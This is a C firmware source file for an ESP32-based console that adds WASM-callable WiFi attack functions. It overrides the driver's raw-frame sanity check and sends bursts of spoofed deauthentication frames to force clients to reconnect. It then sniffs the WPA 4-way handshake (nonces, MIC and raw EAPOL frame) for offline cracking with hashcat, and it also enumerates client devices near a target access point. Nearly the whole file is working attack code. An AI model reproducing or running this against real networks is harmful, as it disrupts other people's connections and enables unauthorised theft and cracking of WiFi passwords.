/**
 * @file akira_wifi_api.c
 * @brief WiFi injection/sniffer WASM-native API: 4-way-handshake (PMKID)
 *        capture and client enumeration.
 *
 * The passive scan natives (wifi_scan_rssi/wifi_scan_aps) and the deauth
 * injector (wifi_deauth) live in akira_rf_api.c on this release line; this
 * file adds only the two console-exclusive sniffer natives, which drive the
 * radio into promiscuous mode and therefore need their own owner tracking and
 * app-teardown release hook.
 *
 * Containment (akira_app_containment.h): promiscuous mode is owned by the app
 * slot that armed it; a sniffer callback never holds a pointer into app linear
 * memory (it fills a host buffer the app thread copies out); every app-chosen
 * wait is bounded and stop-aware; and a release hook disarms the sniffers and
 * hands the radio back when the app ends, however it ends.
 */

#include "akira_api.h"
#include <crystal/akira_seal.h>
#include "akira_rf_api.h"
#include "akira_wifi_api.h"
#include "akira_wasm_mem.h"
#include <runtime/security.h>
#include <akira_app_containment.h>
#include <lib/mem_helper.h>
#include <zephyr/logging/log.h>

#ifdef CONFIG_WIFI
#include <zephyr/net/net_if.h>
#include <zephyr/net/net_mgmt.h>
#include <zephyr/net/wifi_mgmt.h>
#if defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32)
#include <esp_wifi.h>
#endif
#endif

#include <string.h>

LOG_MODULE_REGISTER(akira_wifi_api, CONFIG_AKIRA_LOG_LEVEL);

/* These natives drive the WASM runtime and the ESP WiFi driver; they only
 * compile when all three are present.  Other targets get a no-op release stub
 * (see the #else at the end of the file). */
#if defined(CONFIG_AKIRA_WASM_RUNTIME) && defined(CONFIG_WIFI) && \
    (defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32))

/* Re-check the full span of a WAMR pointer parameter: "*"/"**"-sig arguments
 * are validated for one byte only. */
#define WASM_ADDR_CHECK(inst, ptr, len)                                 \
    do {                                                                 \
        if (!(ptr) || !wasm_runtime_validate_native_addr((inst),        \
                                                          (ptr), (len)))\
        { return -EFAULT; }                                              \
    } while (0)

/* Weak override: let esp_wifi accept the raw 802.11 frames we inject. A single
 * definition serves every injector (deauth in akira_rf_api.c included). */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    /* return 0 to bypass */
    return 0;
}

/*
 * The radio can be driven into promiscuous/inject mode by only one app at a
 * time (serial, each native blocks on the app's own thread).  Track the owning
 * app slot — NOT the module_inst pointer, which the next app reuses — so
 * akira_wifi_api_release(slot) only tears promiscuous mode down for the app
 * that armed it.
 */
static int g_wifi_owner_slot = -1;

/* Drop promiscuous mode and the sniffer callback, handing the radio back to the
 * managed WiFi stack (best-effort STA/channel restore). */
static void wifi_promisc_release(void)
{
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
}

/* ── 4-way handshake capture (deauth + sniff EAPOL-Key) ─────────────── */

#define HANDSHAKE_TIMEOUT_MS     12000
#define HANDSHAKE_MAX_TIMEOUT_MS 30000   /* cap app-chosen waits */
#define HANDSHAKE_DEAUTH_COUNT   15

/* WAMR-visible result structure (mirrors handshake_capture_result_t in SDK) */
struct handshake_wire {
    uint8_t  ap_mac[6];     /* AP BSSID */
    uint8_t  sta_mac[6];    /* Client MAC */
    uint8_t  anonce[32];    /* ANonce from M1 */
    uint8_t  snonce[32];    /* SNonce from M2 */
    uint8_t  mic[16];       /* MIC from M2 */
    uint8_t  eapol_frame[256]; /* raw EAPOL frame (M2) for hashcat 22000 */
    uint16_t eapol_len;     /* length of eapol_frame */
    char     ssid[33];      /* AP SSID (null-terminated) */
    int32_t  found;         /* 1 = handshake complete, 0 = timeout */
};

static struct {
    uint8_t            target_bssid[6];
    struct handshake_wire *result;   /* points at g_hs_host (host RAM), never app RAM */
    bool               have_m1;
    bool               have_m2;
    bool               armed;
    int                owner_slot;
} g_hs_ctx;

/* Sniffer callbacks run on the WiFi driver thread and must never hold a pointer
 * into app linear memory — the app can be stopped/freed under them.  They fill
 * this host-side buffer (PSRAM); the app thread copies it into app memory at the
 * end of the native call. */
static struct handshake_wire g_hs_host AKIRA_BULK_BSS;

/* 802.11 mgmt header offsets */
#define FC_OFFSET       0
#define ADDR1_OFFSET    4
#define ADDR2_OFFSET    10
#define ADDR3_OFFSET    16
#define DATA_HDR_MIN    24
#define DATA_HDR_MAX    28
#define LLC_SNAP_LEN    8
#define EAPOL_HDR_LEN   4

/* Find LLC/SNAP start by scanning for the 0xAA 0xAA 0x03 pattern. */
static int eapol_find_llc(const uint8_t *payload, uint32_t data_len)
{
    for (int off = DATA_HDR_MIN; off <= DATA_HDR_MAX; off += 2) {
        if (off + LLC_SNAP_LEN + 2 > data_len) break;
        if (payload[off] == 0xAA && payload[off+1] == 0xAA && payload[off+2] == 0x03) {
            return off;
        }
    }
    return -1;
}

/* Offsets inside the EAPOL-Key body that we read from an over-the-air frame. */
#define EAPOL_KEY_NONCE_OFF  13   /* Desc(1)+KeyInfo(2)+KeyLen(2)+ReplayCtr(8) */
#define EAPOL_KEY_NONCE_LEN  32
#define EAPOL_KEY_MIC_OFF    77
#define EAPOL_KEY_MIC_LEN    16

/* EAPOL-Key parse over an attacker-controlled frame: every field is read only
 * after confirming it lies within @p data_len (the real captured length).  A
 * malformed/truncated frame returns NULL instead of reading out of bounds.
 * Returns a pointer to the 32-byte Key Nonce, sets *out_mic (16 bytes) if
 * requested, and copies the raw EAPOL frame into out_frame (bounded) if
 * requested. */
static const uint8_t *eapol_get_nonce(const uint8_t *payload, uint32_t data_len,
                                       uint8_t *out_mic,
                                       uint8_t *out_frame, uint16_t *out_len,
                                       uint16_t max_frame)
{
    int llc_off = eapol_find_llc(payload, data_len);
    if (llc_off < 0) return NULL;

    uint32_t eapol_off = (uint32_t)llc_off + LLC_SNAP_LEN;
    /* Need the LLC EtherType bytes (llc+6,7) and the 4-byte EAPOL header. */
    if (eapol_off + EAPOL_HDR_LEN > data_len) return NULL;

    const uint8_t *llc = payload + llc_off;
    if (llc[6] != 0x88 || llc[7] != 0x8E) return NULL; /* not EAPOL */

    const uint8_t *eapol = payload + eapol_off;
    if (eapol[1] != 3) return NULL; /* not EAPOL-Key */

    uint32_t key_off = eapol_off + EAPOL_HDR_LEN;

    /* Key Nonce must be fully present. */
    if (key_off + EAPOL_KEY_NONCE_OFF + EAPOL_KEY_NONCE_LEN > data_len) {
        return NULL;
    }

    if (out_mic) {
        if (key_off + EAPOL_KEY_MIC_OFF + EAPOL_KEY_MIC_LEN > data_len) {
            return NULL;
        }
        memcpy(out_mic, payload + key_off + EAPOL_KEY_MIC_OFF, EAPOL_KEY_MIC_LEN);
    }

    if (out_frame && out_len) {
        uint16_t eapol_body_len = (uint16_t)((eapol[2] << 8) | eapol[3]);
        uint32_t total = (uint32_t)EAPOL_HDR_LEN + eapol_body_len;
        uint32_t avail = data_len - eapol_off;          /* bytes left from eapol */
        if (total > avail)      total = avail;
        if (total > max_frame)  total = max_frame;
        memcpy(out_frame, eapol, total);
        *out_len = (uint16_t)total;
    }

    return payload + key_off + EAPOL_KEY_NONCE_OFF;
}

static void handshake_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_hs_ctx.armed || !g_hs_ctx.result || type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    /* sig_len is attacker-influenced; guard the FCS subtraction against
     * underflow before using it as a length for any read. */
    if (pkt->rx_ctrl.sig_len < 4) return;
    uint32_t data_len = (uint32_t)pkt->rx_ctrl.sig_len - 4; /* strip FCS */
    if (data_len < DATA_HDR_MIN + LLC_SNAP_LEN + EAPOL_HDR_LEN) return;

    uint8_t *payload = pkt->payload;
    uint8_t  fc1     = payload[FC_OFFSET + 1];
    bool     from_ap = (fc1 & 0x02) != 0;   /* FromDS */
    bool     to_ap   = (fc1 & 0x01) != 0;   /* ToDS   */

    /* Check BSSID matches target: SA for FromDS, DA for ToDS */
    if (from_ap) {
        if (memcmp(payload + ADDR2_OFFSET, g_hs_ctx.target_bssid, 6) != 0) return;
    } else if (to_ap) {
        if (memcmp(payload + ADDR1_OFFSET, g_hs_ctx.target_bssid, 6) != 0) return;
    } else {
        return;
    }

    const uint8_t *nonce = NULL;
    uint8_t       mic_buf[16];

    if (from_ap && !g_hs_ctx.have_m1) {
        /* M1 — capture ANonce + AP/STA MACs */
        nonce = eapol_get_nonce(payload, data_len, NULL, NULL, NULL, 0);
        if (!nonce) return;
        memcpy(g_hs_ctx.result->anonce, nonce, 32);
        memcpy(g_hs_ctx.result->ap_mac,  payload + ADDR2_OFFSET, 6);
        memcpy(g_hs_ctx.result->sta_mac, payload + ADDR1_OFFSET, 6);
        g_hs_ctx.have_m1 = true;
        LOG_INF("HS: M1 captured");
    }

    if (to_ap && !g_hs_ctx.have_m2) {
        /* M2 — capture SNounce + MIC + raw EAPOL frame */
        nonce = eapol_get_nonce(payload, data_len, mic_buf,
                                g_hs_ctx.result->eapol_frame,
                                &g_hs_ctx.result->eapol_len,
                                sizeof(g_hs_ctx.result->eapol_frame));
        if (!nonce) return;
        memcpy(g_hs_ctx.result->snonce, nonce, 32);
        memcpy(g_hs_ctx.result->mic, mic_buf, 16);
        memcpy(g_hs_ctx.result->sta_mac, payload + ADDR2_OFFSET, 6);
        g_hs_ctx.have_m2 = true;
        LOG_INF("HS: M2 captured");
    }

    if (g_hs_ctx.have_m1 && g_hs_ctx.have_m2) {
        g_hs_ctx.result->found = 1;
        g_hs_ctx.armed = false;   /* app thread polls ->found and disarms fully */
    }
}

int akira_native_wifi_capture_pmkid(wasm_exec_env_t exec_env,
                                     void *bssid_ptr, void *client_ptr,
                                     int32_t channel, const char *ssid_str,
                                     void *result_ptr, int32_t timeout_ms)
{
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);
    AKIRA_SEAL_GATE_OR_RETURN(exec_env, AKIRA_SEAL_WIFI_INJECT, NULL, -EACCES);

    if (!bssid_ptr || !client_ptr || !result_ptr) return -EINVAL;
    if (channel < 1 || channel > 14)             return -EINVAL;
    if (timeout_ms < 1000) timeout_ms = HANDSHAKE_TIMEOUT_MS;
    if (timeout_ms > HANDSHAKE_MAX_TIMEOUT_MS) timeout_ms = HANDSHAKE_MAX_TIMEOUT_MS;

    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
    WASM_ADDR_CHECK(inst, bssid_ptr,  6);
    WASM_ADDR_CHECK(inst, client_ptr, 6);
    WASM_ADDR_CHECK(inst, result_ptr, sizeof(struct handshake_wire));
    WASM_ADDR_CHECK(inst, (void *)ssid_str, 1);

    const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
    const uint8_t *client = (const uint8_t *)client_ptr;
    struct handshake_wire *app_result = (struct handshake_wire *)result_ptr;

    /* Fill the host-side result buffer; the sniffer writes only here so a
     * callback can never hold a pointer into app memory. */
    memset(&g_hs_host, 0, sizeof(g_hs_host));
    int slen = 0;
    while (ssid_str[slen] && slen < 32) slen++;
    memcpy(g_hs_host.ssid, ssid_str, slen);
    g_hs_host.ssid[slen] = '\0';

    memcpy(g_hs_ctx.target_bssid, bssid, 6);
    g_hs_ctx.result     = &g_hs_host;
    g_hs_ctx.have_m1    = false;
    g_hs_ctx.have_m2    = false;
    g_hs_ctx.owner_slot = akira_runtime_slot_of_exec_env(exec_env);
    g_wifi_owner_slot   = g_hs_ctx.owner_slot;
    g_hs_ctx.armed      = true;

    esp_wifi_set_promiscuous_rx_cb(handshake_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    /* Send aggressive deauth burst to force client reconnection */
    LOG_INF("wifi_capture: sending %d deauth on ch%d", HANDSHAKE_DEAUTH_COUNT, channel);
    struct __attribute__((packed)) {
        uint8_t  fc[2], dur[2], da[6], sa[6], bssid[6], seq[2], reason[2];
    } dframe;
    dframe.fc[0]     = 0xC0; dframe.fc[1]     = 0x00;
    dframe.dur[0]    = 0x3A; dframe.dur[1]    = 0x01;
    dframe.reason[0] = 0x07; dframe.reason[1] = 0x00;
    memcpy(dframe.da,    client, 6);
    memcpy(dframe.sa,    bssid,  6);
    memcpy(dframe.bssid, bssid,  6);

    for (int i = 0; i < HANDSHAKE_DEAUTH_COUNT; i++) {
        if (akira_runtime_stop_requested(exec_env)) break;
        dframe.seq[0] = (uint8_t)(i << 4);
        dframe.seq[1] = 0;
        esp_wifi_80211_tx(WIFI_IF_STA, &dframe, sizeof(dframe), true);
        if (akira_runtime_sleep(exec_env, K_MSEC(30))) break; /* stopping */
    }

    /* Wait for both M1 + M2 or timeout, in interruptible slices so a stop wakes
     * us immediately instead of pinning the radio for the whole window. */
    int64_t deadline = k_uptime_get() + timeout_ms;
    while (k_uptime_get() < deadline) {
        if (g_hs_host.found) break;
        if (akira_runtime_sleep(exec_env, K_MSEC(100))) break; /* stopping */
    }

    /* ALWAYS disarm + restore, on every exit path, before touching app memory. */
    g_hs_ctx.armed = false;
    wifi_promisc_release();   /* no more callbacks after this returns */

    bool found = g_hs_host.found;
    bool m1    = g_hs_ctx.have_m1;
    bool m2    = g_hs_ctx.have_m2;

    /* Copy the host result into app memory on the app thread (memory still valid
     * here), then drop the host pointer. */
    memcpy(app_result, &g_hs_host, sizeof(*app_result));

    g_hs_ctx.result     = NULL;
    g_hs_ctx.owner_slot = -1;
    g_wifi_owner_slot   = -1;

    if (found) {
        LOG_INF("wifi_capture: handshake complete for %s", g_hs_host.ssid);
        return 1;
    }

    LOG_WRN("wifi_capture: timeout — %s%s", m1 ? "M1 " : "", m2 ? "M2 " : "no EAPOL");
    return 0;
}

/* ── Client enumeration (passive sniff on one channel) ─────────────────── */

#define CLIENT_SNIFF_MAX     64
#define CLIENT_SNIFF_DEF_MS  4000
#define CLIENT_SNIFF_MAX_MS  30000   /* cap app-chosen waits */

/* WAMR-visible record (mirrors akira_wifi_client_t in SDK) */
struct client_wire {
    uint8_t mac[6];
    int8_t  rssi;
};

static struct {
    uint8_t            target_bssid[6];
    struct client_wire *out;         /* points at g_cl_host (host RAM), never app RAM */
    int                max_clients;
    int                count;
    bool               armed;
    int                owner_slot;
} g_cl_ctx;

/* Host-side sniff buffer — see g_hs_host rationale. */
static struct client_wire g_cl_host[CLIENT_SNIFF_MAX] AKIRA_BULK_BSS;

/* 802.11 address fields (payload[4]=ADDR1, payload[10]=ADDR2, [16]=ADDR3) */
static bool mac_is_broadcast_or_multicast(const uint8_t *mac)
{
    return (mac[0] & 0x01) != 0;
}

static void client_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!g_cl_ctx.armed || !g_cl_ctx.out) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;

    uint8_t *payload = pkt->payload;
    uint8_t  fc0     = payload[FC_OFFSET];
    uint8_t  fc1     = payload[FC_OFFSET + 1];
    uint8_t  ftype   = fc0 & 0x0C;
    uint8_t  subtype = (fc0 >> 4) & 0x0F;
    bool     from_ap = (fc1 & 0x02) != 0;   /* FromDS */
    bool     to_ap   = (fc1 & 0x01) != 0;   /* ToDS   */

    const uint8_t *client_mac = NULL;

    if (ftype == 0x08 && from_ap &&
        memcmp(payload + ADDR2_OFFSET, g_cl_ctx.target_bssid, 6) == 0) {
        /* Data frame AP→client: BSSID in SA(ADDR2), client in DA(ADDR1) */
        client_mac = payload + ADDR1_OFFSET;
    } else if (ftype == 0x08 && to_ap &&
               memcmp(payload + ADDR1_OFFSET, g_cl_ctx.target_bssid, 6) == 0) {
        /* Data frame client→AP: BSSID in DA(ADDR1), client in SA(ADDR2) */
        client_mac = payload + ADDR2_OFFSET;
    } else if (ftype == 0x00 && subtype == 0x04) {
        /* Probe request from any device sniffing on this channel */
        client_mac = payload + ADDR2_OFFSET; /* SA */
    }

    if (!client_mac || mac_is_broadcast_or_multicast(client_mac)) return;

    int8_t rssi = (int8_t)pkt->rx_ctrl.rssi;

    /* Dedupe — keep the strongest RSSI per MAC */
    for (int i = 0; i < g_cl_ctx.count; i++) {
        if (memcmp(g_cl_ctx.out[i].mac, client_mac, 6) == 0) {
            if (rssi > g_cl_ctx.out[i].rssi) g_cl_ctx.out[i].rssi = rssi;
            return;
        }
    }

    if (g_cl_ctx.count < g_cl_ctx.max_clients) {
        memcpy(g_cl_ctx.out[g_cl_ctx.count].mac, client_mac, 6);
        g_cl_ctx.out[g_cl_ctx.count].rssi = rssi;
        g_cl_ctx.count++;
    }
}

int akira_native_wifi_scan_clients(wasm_exec_env_t exec_env,
                                    void *bssid_ptr, void *out_ptr,
                                    uint32_t out_len, int32_t channel,
                                    int32_t timeout_ms)
{
    /* Client enumeration arms promiscuous injection mode, so it is gated like
     * the other injection natives (was missing both checks). */
    AKIRA_CHECK_CAP_OR_RETURN(exec_env, AKIRA_CAP_WIFI_INJECT, -EPERM);
    AKIRA_SEAL_GATE_OR_RETURN(exec_env, AKIRA_SEAL_WIFI_INJECT, NULL, -EACCES);

    if (!bssid_ptr || !out_ptr) return -EINVAL;
    if (channel < 1 || channel > 14) return -EINVAL;

    int max_clients = (int)(out_len / sizeof(struct client_wire));
    if (max_clients < 1) return -EINVAL;
    if (max_clients > CLIENT_SNIFF_MAX) max_clients = CLIENT_SNIFF_MAX;
    if (timeout_ms < 1000) timeout_ms = CLIENT_SNIFF_DEF_MS;
    if (timeout_ms > CLIENT_SNIFF_MAX_MS) timeout_ms = CLIENT_SNIFF_MAX_MS;

    wasm_module_inst_t inst = wasm_runtime_get_module_inst(exec_env);
    WASM_ADDR_CHECK(inst, bssid_ptr, 6);
    WASM_ADDR_CHECK(inst, out_ptr, out_len);

    const uint8_t *bssid   = (const uint8_t *)bssid_ptr;
    struct client_wire *app_out = (struct client_wire *)out_ptr;

    /* The RX callback fills the host buffer; app memory is written only here, on
     * the app thread, after the sniff window closes. */
    memset(g_cl_host, 0, sizeof(g_cl_host));
    memcpy(g_cl_ctx.target_bssid, bssid, 6);
    g_cl_ctx.out         = g_cl_host;
    g_cl_ctx.max_clients = max_clients;
    g_cl_ctx.count       = 0;
    g_cl_ctx.owner_slot  = akira_runtime_slot_of_exec_env(exec_env);
    g_wifi_owner_slot    = g_cl_ctx.owner_slot;
    g_cl_ctx.armed       = true;

    esp_wifi_set_promiscuous_rx_cb(client_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    /* Sniff window, in interruptible slices so a stop wakes us promptly. */
    int64_t deadline = k_uptime_get() + timeout_ms;
    while (k_uptime_get() < deadline) {
        if (akira_runtime_sleep(exec_env, K_MSEC(100))) break; /* stopping */
    }

    /* ALWAYS disarm + restore before touching app memory. */
    g_cl_ctx.armed = false;
    wifi_promisc_release();   /* no more callbacks after this returns */

    int n = g_cl_ctx.count;
    if (n > max_clients) n = max_clients;
    if (n > 0) {
        memcpy(app_out, g_cl_host, (size_t)n * sizeof(struct client_wire));
    }

    g_cl_ctx.out        = NULL;
    g_cl_ctx.owner_slot = -1;
    g_wifi_owner_slot   = -1;

    LOG_INF("wifi_scan_clients: ch%d → %d clients", channel, n);
    return n;
}

/* ── App teardown ──────────────────────────────────────────────────────────── */

void akira_wifi_api_release(int slot)
{
    /* Only tear down injection state for the app that armed it; another app's
     * active capture/deauth must survive this app's exit. */
    if (slot < 0 || (g_wifi_owner_slot >= 0 && g_wifi_owner_slot != slot)) {
        return;
    }

    /* Disarm the sniffers first so any in-flight callback bails, then drop
     * promiscuous mode and the callback (best-effort STA/channel restore). */
    g_hs_ctx.armed = false;
    g_cl_ctx.armed = false;
    wifi_promisc_release();

    g_hs_ctx.result     = NULL;
    g_hs_ctx.owner_slot = -1;
    g_cl_ctx.out        = NULL;
    g_cl_ctx.owner_slot = -1;
    g_wifi_owner_slot   = -1;

    LOG_INF("wifi injection released for slot %d", slot);
}

/* Release WiFi injection state when a WASM app ends, however it ends. Ordered
 * with the RF release (60): promiscuous mode is on the WiFi radio, independent
 * of the sub-GHz RF chip the RF hook frees. */
static void wifi_release(int slot, const char *app_name)
{
    ARG_UNUSED(app_name);
    akira_wifi_api_release(slot);
}

AKIRA_APP_RESOURCE_DEFINE(wifi, 60, NULL, wifi_release);

/* ── WASM export registration ───────────────────────────────────────────── */

#if defined(CONFIG_AKIRA_WASM_API)
#include <akira_native_registry.h>

static const NativeSymbol akira_wifi_natives[] = {
    /* 4-way handshake / PMKID capture — requires wifi.inject capability */
    {"wifi_capture_pmkid",  (void *)akira_native_wifi_capture_pmkid,  "(**i$*i)i",  NULL},
    /* Associated-client enumeration — requires wifi.inject capability */
    {"wifi_scan_clients",   (void *)akira_native_wifi_scan_clients,   "(**~ii)i",   NULL},
};

AKIRA_NATIVE_API_DEFINE(akira_wifi_api, "env", akira_wifi_natives);
#endif

#else  /* !(CONFIG_AKIRA_WASM_RUNTIME && CONFIG_WIFI && (ESP32S3 || ESP32)) */

/* No promiscuous/injection path on this target — nothing to release. */
void akira_wifi_api_release(int slot) { (void)slot; }

#endif /* CONFIG_AKIRA_WASM_RUNTIME && CONFIG_WIFI && ESP32S3/ESP32 */
